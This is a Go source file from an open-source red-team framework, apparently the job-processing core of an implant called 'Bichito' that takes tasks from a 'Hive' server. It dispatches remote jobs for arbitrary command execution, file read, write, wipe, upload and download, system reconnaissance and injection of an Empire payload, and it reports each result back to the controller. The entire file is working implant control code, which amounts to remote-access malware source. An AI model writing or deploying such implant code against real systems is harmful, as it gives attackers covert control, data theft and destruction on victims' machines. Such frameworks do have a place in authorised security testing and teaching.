//{{{{{{{ Bichito Jobs Functions }}}}}}}

//// Functions related to how implant process/handle received jobs
// A. jobprocessor

//By Rebujacker - Alvaro Folgado Rueda as an open source educative project
package main

import (
	"bichito/modules/biterpreter"
	"time"
	"strconv"
	"strings"
	//Debug
	"fmt"

)

var received bool = false

// Process Implant Jobs to be executed in Bot Machine
// A. Define a timeout to finish the Jobs and don't let the Implant hanging
// B. If jobs to process by implant is empty just create a ping job to the Hive
// C. Update the Job with output of executed commands

func jobProcessor(){

	//Lock shared Slice
	//jobsToProcess.mux.RLock()

	if ((len(jobsToProcess.Jobs) == 0) && (!received)) {
		
		ping := Job{"","","",bid,"BiPing","","","",""}
		jobsToHive.mux.Lock()
		defer jobsToHive.mux.Unlock()
		jobsToHive.Jobs = append(jobsToHive.Jobs,&ping)
		return
	}

	contChannel := make(chan string, 1)
	biJobTimeout := time.NewTimer(time.Duration(10) * time.Second)
	var result,timeR string
	var error bool
	
	for _,job := range jobsToProcess.Jobs{

		//Debug:
		//fmt.Println(job.Job)
		//Stop buffering pings once we know we are in Hive DB (to reduce overhead)
		if job.Job == "received"{
			received = true
			break
		}

		go func() {
		  	
		   	switch job.Job{
		   	
		   		// Implant Lifecycle
		   		
		   		case "respTime":

		   			i, err := strconv.Atoi(job.Parameters)
		   			if err != nil{
						result = "Error Converting resptime string to int:"+ err.Error()
					}

					resptime = i
		   			ttl = ttl + resptime
		   			result = "RespTime changed to "+job.Parameters+" seconds"
		   			contChannel <- "continue"
		   		
		   		case "ttl":

		   			i, err := strconv.Atoi(job.Parameters)
		   			if err != nil{
						result = "Error Converting ttl string to int:"+ err.Error()
					}

					ttl = i
		   			result = "TTL changed to "+job.Parameters+" seconds"
		   			contChannel <- "continue"

		   		// Implant Basic Capabilities
		   		case "sysinfo":

		   			error,result = biterpreter.Sysinfo()
		   			if error{
						result = "Error Getting System Info:"+result
					}
		   			contChannel <- "continue"

		   		
		   		case "exec":
		   			error,result = biterpreter.Exec(job.Parameters)
		   			if error{
						result = "Error Executing Command:"+ result
					}
		   			contChannel <- "continue"

		   		
		   		case "ls":
		   			error,result = biterpreter.List(job.Parameters)
		   			if error{
						result = "Error Executing Command:"+ result
					}
		   			contChannel <- "continue"

		   		
		   		case "accesschk":
		   			error,result = biterpreter.Accesschk(job.Parameters)
		   			if error{
						result = "Error Executing Command:"+ result
					}
		   			contChannel <- "continue"

		   		
		   		case "read":
		   			error,result = biterpreter.Read(job.Parameters)
		   			if error{
						result = "Error Executing Command:"+ result
					}
		   			contChannel <- "continue"

		   		case "write":
		   			error,result = biterpreter.Write(job.Parameters)
		   			if error{
						result = "Error Executing Command:"+ result
					}
		   			contChannel <- "continue"

		   		case "wipe":
		   			error,result = biterpreter.Wipe(job.Parameters)
		   			if error{
						result = "Error Executing Command:"+ result
					}
		   			contChannel <- "continue"

		   		case "upload":
		   			
		   			arguments := strings.Split(job.Parameters," ")
		   			destinyPath := arguments[1]
		   			blob := job.Result 
		   			//Debug:
		   			//fmt.Println(len(blob))
		   			error,result = biterpreter.Upload(destinyPath,blob)
		   			if error{
						result = "Error Executing Command:"+ result
					}
		   			contChannel <- "continue"

		   		case "download":
		   			
		   			arguments := strings.Split(job.Parameters," ")
		   			destinyPath := arguments[0]
		   			error,result = biterpreter.Download(destinyPath)
		   			if error{
						result = "Error Executing Command:"+ result
					}
		   			contChannel <- "continue"

		   		//Staging/POST Actions
		   		case "injectEmpire":

		   			error,result = biterpreter.InjectEmpire(job.Parameters)
		   			if error{
						result = "Error Injecting Empire:"+ result
					}
		   			contChannel <- "continue"
		   		default:
		   			result = "Void No Job Inplemented"
		   			contChannel <- "continue"		
		   	}

	
		}()

		select{
			case <- contChannel:
						
		   			timeR = time.Now().Format("02/01/2006 15:04:05 MST")
		   			
		   			//Check that the size of the Result doesn't exceed 20 MB
		   			bytesResult := len(result)
					//Debug: Job size
		   			//fmt.Println("Job Result Size:")
		   			//fmt.Println(bytesResult)
					if (bytesResult >= 20000000){
						job.Result = "Too Big payload, use staging channel for these sizes"
						job.Status = "Error"
					}else{
						job.Result = result
						job.Status = "Success"	
					}

					job.Time = timeR

					jobsToHive.mux.Lock()
		   			jobsToHive.Jobs = append(jobsToHive.Jobs,job)
		   			jobsToHive.mux.Unlock()

			case <- biJobTimeout.C:

					timeR = time.Now().Format("02/01/2006 15:04:05 MST")
					job.Result = "Job Timeout"
					job.Status = "Error"
					job.Time = timeR

					jobsToHive.mux.Lock()
		   			jobsToHive.Jobs = append(jobsToHive.Jobs,job)
		   			jobsToHive.mux.Unlock()

		   			biJobTimeout.Reset(time.Duration(10) * time.Second)
		   			//Reset timeout and continue with next one
		   			//jobsToProcess.Jobs = jobsToProcess.Jobs[i+1:]
		   			//return
		}

	}
	//jobsToProcess.mux.RUnlock()

	//Clean all processed jobs
	jobsToProcess.mux.Lock()
	jobsToProcess.Jobs = jobsToProcess.Jobs[:0]
	jobsToProcess.mux.Unlock()
	return
}
